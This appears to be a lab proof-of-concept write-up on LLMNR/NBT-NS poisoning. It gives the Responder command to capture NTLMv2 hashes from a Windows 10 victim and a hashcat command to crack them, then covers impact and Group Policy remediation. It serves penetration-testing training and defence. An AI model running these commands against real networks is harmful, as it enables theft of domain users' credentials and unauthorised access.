# POC-02 – LLMNR/NBT-NS Poisoning with Responder

**ATT&CK:** T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning
**Host:** Kali (listener) ↔ Windows 10 (victim)
**Tools:** Responder, hashcat

## Steps

### 1. Start Responder on Kali
```bash
sudo responder -I eth0 -wrf
```

### 2. Trigger name resolution broadcasts from the Windows 10 VM
On the Windows 10 host, attempt to access a non-existent share to force an LLMNR/NBT-NS broadcast:
```
\\nonexistent-server\share
```

### 3. Capture
Responder logs an NTLMv2 hash for the domain user to `/usr/share/responder/logs/`.

### 4. Crack offline
```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

## Observation
Record the captured username/domain and whether the password cracked against a common wordlist.

## Evidence
`![Responder capturing NTLMv2 hash](screenshots/poc02-responder-capture.png)`

## Impact
A single mistyped share name from any domain user yields credentials an attacker can crack offline or relay, often leading to an initial foothold.

## Remediation
Disable LLMNR and NBT-NS via Group Policy, enable SMB signing, and deploy an NTLM relay–aware monitoring solution.
